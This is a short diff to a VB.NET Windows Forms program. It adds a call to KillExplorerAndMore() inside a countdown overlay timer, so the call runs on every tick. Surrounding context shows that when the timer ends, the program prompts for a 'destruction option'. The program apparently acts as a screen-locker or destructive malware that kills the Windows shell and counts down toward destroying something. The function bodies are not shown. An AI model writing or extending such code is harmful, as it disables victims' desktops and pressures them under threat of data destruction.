@@ -506,6 +506,8 @@ Public Class Form1
             If overlay.countdownTime > 0 Then
                 overlay.countdownTime -= 1
                 overlay.timerLabel.Text = "Remaining Time: " & overlay.countdownTime.ToString() & " seconds"
+                KillExplorerAndMore()
+
             Else
                 ' When countdown finishes, prompt user for destruction option
                 Dim options As String() = {
